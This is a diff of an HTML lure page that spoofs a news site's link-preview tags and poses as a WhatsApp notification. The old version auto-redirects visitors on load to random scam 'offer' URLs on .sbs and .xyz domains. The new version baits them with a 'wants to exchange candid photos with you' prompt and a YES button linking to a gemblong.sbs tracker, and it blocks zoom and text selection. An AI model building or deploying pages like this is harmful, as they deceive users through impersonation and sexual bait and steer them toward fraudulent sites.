@@ -1,12 +1,12 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <link rel="canonical" href="https://www.fairobserver.com/">
     <meta name="robots" content="index, follow">
     <meta name="referrer" content="no-referrer-when-downgrade">
-    <meta property="og:title" content="🟢 Online - Connecting to Livestream...">
+    <meta property="og:title" content="① WhatsApp is active🟢">
     <meta property="og:description" content="Browse trending profiles and discover new updates shared by active users.">
     <meta property="og:image" content="https://snipboard.io/4wixUa.jpg">
     <meta property="og:url" content="https://www.fairobserver.com/">
@@ -14,72 +14,280 @@
     <meta property="og:site_name" content="Connecting to Livestream...">
     <meta property="fb:app_id" content="124024574287414">
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:title" content="🟢 Online - Connecting to Livestream...">
+    <meta name="twitter:title" content="① WhatsApp is active🟢">
     <meta name="twitter:description" content="Browse trending profiles and discover new updates shared by active users.">
     <meta name="twitter:image" content="https://snipboard.io/4wixUa.jpg">
-    
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <title>🟢 Online - Connecting to Livestream...</title>
+    <title>① WhatsApp is active🟢</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
 
     <style>
-        body {
+        :root {
+            --primary-color: #d90429;
+            --primary-hover: #ef233c;
+            --text-white: #ffffff;
+            --text-gray: #e0e0e0;
+            --overlay-dark: rgba(0, 0, 0, 0.65);
+        }
+
+        * {
+            box-sizing: border-box;
             margin: 0;
             padding: 0;
-            background-color: #075e54; /* Warna background hijau WhatsApp */
-            color: #fff;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        html, body {
+            min-height: 100%;
+            font-family: 'Inter', sans-serif;
+            background-color: #111;
+            color: var(--text-white);
+            overflow-x: hidden;
+        }
+
+        body {
+            margin: 0;
+            position: relative;
+        }
+
+        a {
+            text-decoration: none;
+            color: inherit;
+        }
+
+        .layout {
+            min-height: 100vh;
+            position: relative;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
-        .loader-container {
+
+        .main-block {
+            position: relative;
+            z-index: 10;
+            width: 100%;
+            max-width: 480px;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .steps-wrap {
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            padding: 20px;
+            position: relative;
+            z-index: 11;
             text-align: center;
         }
-        .spinner {
-            border: 4px solid rgba(255,255,255,0.3);
-            border-radius: 50%;
-            border-top: 4px solid #fff;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 15px;
+
+        .bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            z-index: 1;
+            background-color: #000;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+
+        .bg::after {
+            background: linear-gradient(to bottom, rgba(0,0,0,0.5), rgba(0,0,0,0.85) 80%);
+            content: '';
+            position: absolute;
+            inset: 0;
+            z-index: 2;
+            pointer-events: none;
         }
-        .text {
-            font-size: 14px;
-            opacity: 0.8;
-            letter-spacing: 0.5px;
+
+        .bg-stage {
+            width: 100%;
+            animation: bgScroll 60s linear infinite;
+        }
+
+        .bg-stage img {
+            display: block;
+            width: 100%;
+            height: 100vh;
+            object-fit: cover;
+        }
+
+        @keyframes bgScroll {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(-33.333%); }
+        }
+
+        .step-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            width: 100%;
+            padding: 40px 25px;
+            
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+        }
+
+        .alert-icon {
+            font-size: 3rem;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.1); opacity: 0.8; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .step-title {
+            font-size: 28px;
+            font-weight: 800;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 16px;
+            color: #fff;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+        }
+
+        .step-subtitle {
+            font-size: 18px;
+            line-height: 1.5;
+            color: var(--text-gray);
+            margin-bottom: 10px;
+            font-weight: 400;
+        }
+
+        .step-subtitle strong {
+            color: var(--primary-color);
+            font-weight: 700;
+        }
+
+        .btns-wrap {
+            display: flex;
+            justify-content: center;
+            width: 100%;
+            margin-top: 30px;
+        }
+
+        .btn {
+            display: inline-block;
+            width: 100%;
+            max-width: 280px;
+            padding: 16px 20px;
+            background: linear-gradient(45deg, var(--primary-color), var(--primary-hover));
+            color: white;
+            font-size: 18px;
+            font-weight: 700;
+            text-transform: uppercase;
+            border-radius: 50px;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(217, 4, 41, 0.4);
+            transition: all 0.3s ease;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(217, 4, 41, 0.6);
+            filter: brightness(1.1);
+        }
+
+        .btn:active {
+            transform: translateY(1px);
+            box-shadow: 0 2px 10px rgba(217, 4, 41, 0.3);
+        }
+
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: 0.5s;
+        }
+        
+        .btn:hover::after {
+            left: 100%;
+        }
+
+        @media (max-width: 480px) {
+            .steps-wrap {
+                padding: 15px;
+            }
+            .step-item {
+                padding: 30px 20px;
+            }
+            .step-title {
+                font-size: 24px;
+            }
+            .step-subtitle {
+                font-size: 16px;
+            }
         }
     </style>
 </head>
 <body>
 
-    <div class="loader-container">
-        <div class="spinner"></div>
-        <div class="text">Connecting to Livestream...</div>
+    <div class="bg">
+        <div class="bg-stage">
+            <img src="https://pbs.twimg.com/media/HJzDdSUbAAAWPSB?format=jpg&name=large" alt="Background">
+            <img src="https://pbs.twimg.com/media/HJzDdSUaEAAZIEW?format=jpg&name=large" alt="Background">
+            <img src="https://pbs.twimg.com/media/HJzDdSYa0AApoD2?format=jpg&name=large" alt="Background">
+        </div>
+    </div>
+
+    <div class="layout">
+        <main class="main-block">
+            <div class="steps-wrap">
+                <div class="steps">
+                    <div class="steps-content">
+                        <div class="step-item is-active">
+                            <div class="alert-icon">⚠️</div>
+                            
+                            <h2 class="step-title">Attention!</h2>
+                            <p class="step-subtitle">wants to exchange candid photos with you.</p>
+                            <p class="step-subtitle">You confirm?</p>
+                            
+                            <div class="btns-wrap">
+                                <a class="btn" href="https://KpEl41d.gemblong.sbs/KqTh0qLkMYtGAN37RPIt" id="offerLink">
+                                    YES
+                                </a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </main>
     </div>
 
     <script>
-        const offers = [
-            "https://88l8TfK.gemblong.sbs/TkPMUgGR45ExBi8SsGPa",
-            "https://8yq4Ymh.breilera.sbs/MboRu1EYaHgM671xJxHd",
-            "https://6hprqox.richards32.xyz/lDPJeJ4fx1KXJsy23GFD"
-        ];
-
-        function randomRedirect() {
-            const randomIndex = Math.floor(Math.random() * offers.length);
-            const targetUrl = offers[randomIndex];
+        document.addEventListener('DOMContentLoaded', () => {
+            const btn = document.getElementById('offerLink');
             
-            console.log("Redirecting to: " + targetUrl);
-            
-            window.location.replace(targetUrl);
-        }
-
-        randomRedirect();
+            btn.addEventListener('click', (e) => {
+                if(btn.getAttribute('href') === '#') {
+                    console.log('Offer link belum diatur.');
+                }
+            });
+            document.body.style.userSelect = 'none';
+        });
     </script>
 </body>
 </html>
